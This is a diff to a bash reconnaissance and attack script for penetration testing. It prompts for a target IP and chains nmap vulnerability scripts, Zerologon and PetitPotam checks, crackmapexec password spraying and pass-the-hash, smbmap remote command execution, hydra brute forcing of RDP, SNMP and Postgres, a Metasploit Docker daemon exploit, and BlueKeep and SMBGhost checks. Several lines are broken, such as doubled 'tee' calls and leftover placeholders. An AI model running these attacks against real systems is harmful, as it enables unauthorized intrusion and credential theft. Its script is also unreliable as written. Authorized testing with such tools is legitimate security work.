@@ -8,6 +8,11 @@
 
 set -e
 
+# Set color variables
+GREEN='\033[0;32m'
+RED='\033[0;31m'
+RESET='\033[0m'
+
 # Tools Used:
 # - brutespray: Password spraying tool for various services
 #   Installation: sudo apt-get install brutespray
@@ -28,10 +33,17 @@ set -e
 # If not, you can install Python3 using your system's package manager, and nmap using: sudo apt-get install nmap
 
 # Set variables
-IP="$1"
+# Prompt user for target IP address
+read -p "Enter the target IP address: " IP
+
+# Prompt user for project name
+read -p "Enter the project name: " project_name
+
+# Set variables
 subnet_range=$(echo "$IP" | cut -d. -f1-3)
-results_dir="/Users/jai/reconresults/$IP"
+results_dir="/Users/jai/reconresults/$project_name"
 mkdir -p "$results_dir"
+
  
 # Function to perform a scan and save results
 
@@ -41,39 +53,23 @@ nmap -p- -sC -sV -oA $results_dir/nmap_tcp_scan "$IP"
 echo "Performing UDP Scan..."
 nmap -p- -sC -sU -oA $results_dir/nmap_udp_scan "$IP"
 
-echo "Nmap Script Scan On Port Wise"
+echo "Nmap Script Scan for 21,22,25"
+
 nmap --script "ftp-anon,ftp-vuln*,ftp-*" -p 21 "$IP"
 nmap --script ssh-* -p 22 "$IP"
 
 nmap -n --script "*telnet* and safe" -p 23 "$IP"
 
-nmap --script "smtp-brute,smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-vuln-cve2011-1764,smtp-*" -p 25,465,587 --script-args smtp-ntlm-info.domain=example.com "$IP"
+nmap --script "smtp-brute,smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-vuln-cve2011-1764,smtp-*" -p 25,465,587 --script-args smtp-ntlm-info.domain=example.com "$IP" | tee $results_dir/portwise_script_Scan_results
 
-nmap -sU --script "ntp-info,ntp-monlist,ntp*,ntp* and (discovery or vuln) and not (dos or brute)" -p 123 <target-ip>
+nmap -sU --script "ntp-info,ntp-monlist,ntp*,ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $IP | tee -a $results_dir/portwise_script_Scan_results
 
 echo "Scanning for MSRPC TEST CASES"
-impacket-rpcdump -port 135 <target-ip> | grep -E 'MS-RPRN|MS-PAR'
-impacket-rpcdump -port 135 <target-ip>
-nmap --script msrpc-enum -p 135 <target-ip>
-
-echo "Scanning for SMB TEST CASES"
-nmap --script "smb-brute,smb-enum-shares.nse,smb-enum-users.nse,smb-enum*,smb-protocols,smb-vuln*" -p 445 <target-ip>
-enum4linux -a -v $IP
-netexec smb <target-ip> -u '' -p '' -M zerologon -M petitpotam
-smbmap -H <target-ip> -
-smbclient -N -L <target-ip>
-smbmap -u username -p password -H <target-ip> -x 'ipconfig'
-crackmapexec smb <target-ip> -u username -p password --users
-crackmapexec smb <target-ip> -u users.txt -p password --continue-on-success
-impacket-lookupsid example.local/user@<target-ip> 20000
-crackmapexec smb <target-ip> -u <username> -H hashes.txt
-
-echo "Scanning for MSRPC"
-nmap --script msrpc-enum -p 135 <target-ip>
-# rpcdump for dumping RPC endpoints
-impacket-rpcdump -port 135 <target-ip>
 # Find the Print System Remote Prototol or the Print System Asynchronous Remote Protocol
-impacket-rpcdump -port 135 <target-ip> | grep -E 'MS-RPRN|MS-PAR'
+impacket-rpcdump -port 135 $IP | grep -E 'MS-RPRN|MS-PAR' | tee -a $results_dir/MSRPC_overall_results
+# rpcdump for dumping RPC endpoints
+impacket-rpcdump -port 135 $IP | tee -a $results_dir/MSRPC_overall_results
+nmap --script msrpc-enum -p 135 $IP | tee -a $results_dir/MSRPC_overall_results
 
 echo "Running RPC Login checks..."
 rpcclient -U '' -N "$IP" -c enumdomusers 2>&1 | tee $results_dir/rpc-check.txt
@@ -81,41 +77,68 @@ rpcclient -U '' -N "$IP" -c querydispinfo 2>&1 | tee -a $results_dir/rpc-check.t
 rpcclient -U '' -N "$IP" -c enumdomains 2>&1 | tee -a $results_dir/rpc-check.txt
 rpcclient -U '' -N "$IP" -c enumdomgroups 2>&1 | tee -a $results_dir/rpc-check.txt
 
+echo "Scanning for SMB TEST CASES"
+nmap --script "smb-brute,smb-enum-shares.nse,smb-enum-users.nse,smb-enum*,smb-protocols,smb-vuln*" -p 445 $IP | tee $results_dir/SMB_overall_results
+enum4linux -a -v $IP | tee -a $results_dir/SMB_overall_results
+netexec smb $IP -u '' -p '' -M zerologon -M petitpotam | tee -a $results_dir/SMB_overall_results
+smbmap -H $IP | tee -a $results_dir/SMB_overall_results
+smbclient -N -L $IP | tee -a $results_dir/SMB_overall_results
+smbmap -u username -p password -H $IP -x 'ipconfig' | tee -a $results_dir/SMB_overall_results
+crackmapexec smb $IP -u username -p password --users | tee -a $results_dir/SMB_overall_results
+crackmapexec smb $IP -u users.txt -p password --continue-on-success | tee -a $results_dir/SMB_overall_results
+impacket-lookupsid example.local/user@$IP 20000 | tee -a $results_dir/SMB_overall_results
+crackmapexec smb $IP -u <username> -H hashes.txt | tee -a $results_dir/SMB_overall_results
+
 echo "Running LDAP checks..."
-nmap --script "ldap-brute,ldap-search,ldap-* and not brute" --script-args "ldap.base='cn=users,dc=cqure,dc=net'" -p 389 <target-ip>
+nmap --script "ldap-brute,ldap-search,ldap-* and not brute" --script-args "ldap.base='cn=users,dc=cqure,dc=net'" -p 389 $IP | tee $results_dir/LDAP_overall_results
 # -k: Use Kerberos authentication
-netexec ldap <target-ip> -u usernames.txt -p '' -k
+netexec ldap $IP -u usernames.txt -p '' -k | tee -a $results_dir/LDAP_overall_results
 # --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION`
-netexec ldap <target-ip> -u username -p password --trusted-for-delegation
+netexec ldap $IP -u username -p password --trusted-for-delegation | tee -a $results_dir/LDAP_overall_results
 
 echo "Running MSSQL checks..."
-nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
-cme mssql "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee $results_dir/mssql_results
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP | tee $results_dir/mssql_results
+cme mssql "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/mssql_results
 
 echo "Running MYSQL checks..."
-nmap --script "mysql-info,mysql-enum,mysql-brute,mysql-databases,mysql-users,mysql-*" -p 3306 <target-ip>
+nmap --script "mysql-info,mysql-enum,mysql-brute,mysql-databases,mysql-users,mysql-*" -p 3306 $IP | tee tee $results_dir/mysql_results
 
 echo "AJP"
-nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 <IP>
+nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 $IP | tee tee $results_dir/apache_ajp_results
 
 echo" Running RDP checks..."
-nmap --script "rdp-enum-encryption,rdp-ntlm-info,rdp*" -p 3389 <target-ip>
+nmap --script "rdp-enum-encryption,rdp-ntlm-info,rdp*" -p 3389 $IP | tee tee $results_dir/rdp_results
 #Brute Force Credentials
-hydra -l username -P passwords.txt <target-ip> rdp
+hydra -l username -P passwords.txt $IP rdp | tee -a tee $results_dir/rdp_results
 
 echo "Running SNMP checks ..."
-nmap -sU --script "snmp-info,snmp-interfaces,snmp-processes,snmp-sysdescr,snmp*" -p 161 <target-ip>
+nmap -sU --script "snmp-info,snmp-interfaces,snmp-processes,snmp-sysdescr,snmp*" -p 161 $IP
 #Brute Force the Community Names
-hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target-ip> snmp
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP snmp
 #Snmp-Check is SNMP enumerator.
-snmp-check <target-ip> -p 161 -c public
+snmp-check $IP -p 161 -c public
 
 echo "Running NFS check..."
-nmap --script=nfs-ls,nfs-statfs,nfs-showmount -p 111,2049 <target-ip>
+nmap --script=nfs-ls,nfs-statfs,nfs-showmount -p 111,2049 $IP | tee tee $results_dir/nfs_results
 
 echo "Running vnc checks..."
-nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p '5800,5801,5900,5901' <IP>
+nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p '5800,5801,5900,5901' $IP | tee tee $results_dir/vnc_results
 msf> use auxiliary/scanner/vnc/vnc_none_auth; Spool $results_dir/vncmsf; Set rhosts $IP; run ;Spool off ; exit
+
+echo "Running Docker checks..."
+#PORT 2375, 2376 Pentesting Docker
+
+nmap -sV --script "docker-*" -p 2375,2376 $IP  | tee  $results_dir/docker_Results
+msfconsole -q ;use exploit/linux/http/docker_daemon_tcp; spool $results_dir/docker_Results; set rhost $IP; run; spool off ; exit
+
+echo "Running Postgresql checks..."
+#5432,5433 - Postgresql
+
+#Nmap enumeration
+nmap --script pgsql-brute -p 5432 <target-ip>
+#Brute Force Credentials
+hydra -l username -P passwords.txt <target-ip> postgres
+hydra -L usernames.txt -p password <target-ip> postgres
 
 echo "Looking for web-related vulnerabilities..."
 
@@ -150,10 +173,10 @@ echo "Running password spraying..."
 python3 $HOME/tools/brutespray/brutespray.py --file $results_dir/ -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt -c -o password_spray_results
 
 echo "Checking for BlueKeep vulnerability..."
-python3 $HOME/tools/bluekeep.py "$IP"
+python3 $HOME/tools/bluekeep.py "$IP" | tee -a $results_dir/rdp_results
 
 echo "Checking for SMBGhost vulnerability..."
-python3  $HOME/tools/SMBGhost/scanner.py "$IP"
+python3  $HOME/tools/SMBGhost/scanner.py "$IP" | tee -a 
 
 echo "texttohtml"
 python3 /users/jai/text2html.py -i $results_dir -o $results_dir/results.html
